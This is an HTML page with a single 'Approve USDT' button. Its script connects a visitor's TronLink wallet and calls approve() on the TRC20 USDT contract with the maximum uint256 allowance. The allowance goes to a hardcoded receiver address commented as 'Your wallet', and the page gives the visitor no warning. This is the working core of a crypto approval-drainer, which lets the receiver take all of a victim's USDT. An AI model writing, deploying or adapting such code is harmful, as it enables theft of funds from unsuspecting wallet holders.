<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TRC20 USDT Approval</title>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.5.0/dist/TronWeb.js"></script>
</head>
<body>
  <button id="approveBtn">Approve USDT</button>

  <script>
    const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT Contract
    const RECEIVER_ADDRESS = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN'; // Your wallet

    const connectWallet = async () => {
      if (window.tronWeb && window.tronWeb.ready) {
        return window.tronWeb.defaultAddress.base58;
      } else {
        console.log("Waiting for TronLink...");
        return new Promise(resolve => {
          const check = setInterval(() => {
            if (window.tronWeb && window.tronWeb.ready) {
              clearInterval(check);
              resolve(window.tronWeb.defaultAddress.base58);
            }
          }, 1000);
        });
      }
    };

    const approveUSDT = async () => {
      const userAddress = await connectWallet();

      const tronWeb = window.tronWeb;
      const usdtContract = await tronWeb.contract().at(CONTRACT_ADDRESS);

      const amount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Max uint256

      try {
        const tx = await usdtContract.approve(RECEIVER_ADDRESS, amount).send(); // ðŸ‘ˆ No feeLimit passed
        console.log("Approval TX:", tx);
        alert("Approval Transaction Sent!");
      } catch (err) {
        console.error("Approval Error:", err);
        alert("Approval Failed: " + err.message);
      }
    };

    document.getElementById('approveBtn').addEventListener('click', approveUSDT);
  </script>
</body>
</html>
